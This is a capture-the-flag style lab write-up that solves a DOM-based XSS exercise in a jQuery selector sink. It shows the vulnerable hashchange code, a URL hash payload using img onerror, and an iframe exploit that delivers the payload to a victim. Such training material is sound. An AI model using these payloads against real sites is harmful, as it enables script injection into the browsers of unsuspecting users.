# Lab: DOM XSS in jQuery selector sink using a hashchange event

This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's `$()` selector function to auto-scroll to a given post, whose title is passed via the `location.hash` property.

To solve the lab, deliver an exploit to the victim that calls the `print()` function in their browser.

### Write up

- In this lab, there is a vulnerable jquery code that gets triggered once the hash is inputted.

```javascript
 $(window).on('hashchange', function(){
                            var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
                            if (post) post.get(0).scrollIntoView();
                        });
```

-  when we input something after the hash in the url, it gets stored and executed through the jquery. 

```URL
https://0a17002c0414d0c385ab368400cb0027.web-security-academy.net/#<img src=1 onerror=print()>
```

- That  means like above we can execute a javascript code after the hash, the above code when executes throws an error as the `src` tag doesn't take numerics, and we take the advantage of it by running `print()` on error. which will lead to printing the page.

- But this is not enough since it's a one time event and it doesn't work  in new tabs, so first we got to execute and load the webpage first and only then execute the javascript payload.

- For this, we are given an exploit server where we will craft an exploit/payload for it.

- the exploit we created is :

```html
`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`
```

- Then we checked, and as it was working as intended, we sent it to the victim to solve the lab.